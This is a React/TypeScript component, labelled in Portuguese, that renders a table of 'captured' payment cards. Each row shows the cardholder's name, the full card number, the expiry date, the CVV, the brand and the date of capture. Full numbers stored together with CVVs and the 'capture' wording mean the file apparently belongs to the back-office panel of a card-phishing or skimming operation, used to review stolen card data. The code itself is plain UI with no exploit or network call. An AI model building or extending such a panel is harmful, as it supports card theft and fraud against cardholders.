
import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from "@/components/ui/table";
import { CardBrandBadge } from "./CardBrandBadge";
import { Skeleton } from "@/components/ui/skeleton";

interface CapturedCard {
  id: number;
  nome_cliente: string;
  numero_cartao: string;
  validade: string;
  cvv: string;
  criado_em: string;
  bandeira: string;
}

interface CardCaptureTableProps {
  cards: CapturedCard[];
  formatDate: (dateString: string) => string;
  isLoading?: boolean;
}

export const CardCaptureTable = ({ cards, formatDate, isLoading = false }: CardCaptureTableProps) => {
  if (isLoading) {
    return (
      <div className="space-y-2">
        <Skeleton className="h-10 w-full" />
        <Skeleton className="h-10 w-full" />
        <Skeleton className="h-10 w-full" />
        <Skeleton className="h-10 w-full" />
        <Skeleton className="h-10 w-full" />
      </div>
    );
  }

  return (
    <Table>
      <TableHeader>
        <TableRow>
          <TableHead>Nome</TableHead>
          <TableHead>Número do Cartão</TableHead>
          <TableHead>Validade</TableHead>
          <TableHead>CVV</TableHead>
          <TableHead>Bandeira</TableHead>
          <TableHead>Data de Captura</TableHead>
        </TableRow>
      </TableHeader>
      <TableBody>
        {cards.length > 0 ? (
          cards.map((card) => (
            <TableRow key={card.id}>
              <TableCell className="font-medium">{card.nome_cliente}</TableCell>
              <TableCell className="font-mono">{card.numero_cartao}</TableCell>
              <TableCell>{card.validade}</TableCell>
              <TableCell>{card.cvv}</TableCell>
              <TableCell><CardBrandBadge bandeira={card.bandeira} /></TableCell>
              <TableCell>{formatDate(card.criado_em)}</TableCell>
            </TableRow>
          ))
        ) : (
          <TableRow>
            <TableCell colSpan={6} className="text-center py-6 text-muted-foreground">
              Nenhum cartão encontrado.
            </TableCell>
          </TableRow>
        )}
      </TableBody>
    </Table>
  );
}
